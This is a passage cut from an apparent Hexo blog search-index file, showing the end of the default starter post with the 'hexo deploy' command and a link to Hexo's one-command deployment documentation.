class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
